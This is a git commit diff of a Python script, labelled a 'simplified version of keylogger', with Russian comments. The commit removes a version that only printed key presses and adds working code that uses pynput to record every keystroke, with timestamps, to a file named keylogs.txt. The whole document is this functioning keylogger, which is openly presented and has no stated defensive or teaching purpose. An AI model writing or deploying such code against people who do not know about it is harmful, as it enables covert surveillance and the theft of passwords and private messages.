5657e1edb6d3c7f36291bf25565fa1736847432b
mell <daniilhorn8@gmail.com>
2021-08-02 21:47:06 +0300

    simplified version of keylogger

--- main.py
+++ main.py
@@ -1,23 +1,22 @@
-import pynput
-from pynput import keyboard
+
 from pynput.keyboard import Key, Listener
+import logging
 
-class Keylogger:
-    def __init__(self):
-        self.count = 0 # подсчет символов, если > 10, то запись в файл
-        self.keys = [] # для убодной работы
-
-    # вывод нажатых клавиш
-    def on_press(self, key):
-        print(f"{key} pressed")
-
-    def on_release(self, key):
-        # если зажата клавиша esc - выход из программы
-        if key == Key.esc:
-            return False
+# Задает создание FileHandler с использованием указанного имени файла
+# установка уровеня корневого регистратора на указанный уровень
+# форматирование строки для обработчика 
 
 
-if __name__ == "__main__":
-    obj = Keylogger()
-    with Listener(on_press = obj.on_press, on_release = obj.on_release) as listener:
-        listener.join()
+
+log_dir = ""
+logging.basicConfig(filename=(log_dir + "keylogs.txt"), 
+    level=logging.DEBUG, 
+    format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+
